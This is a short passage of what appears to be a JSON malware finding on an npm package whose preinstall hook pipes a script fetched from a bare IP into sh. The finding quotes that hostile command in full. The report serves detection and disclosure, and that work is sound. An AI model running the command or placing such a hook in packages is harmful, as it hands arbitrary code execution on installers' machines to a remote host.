  "summary": "preinstall script fetches and executes remote shell payload from bare IP over plain HTTP",
  "details": "package.json declares a preinstall lifecycle script `curl -s 216.126.236.46/x.sh|sh` that, on every `npm install`, retrieves an opaque shell script from a hardcoded bare IP over plain HTTP and pipes it directly into `sh`. The remote host controls what runs, execution is unpinned and unverified, and the shipped module is a one-line stub — the manifest is effectively the entire payload. Installing the package yields arbitrary code execution on the installer's machine under the user running `npm install`.",
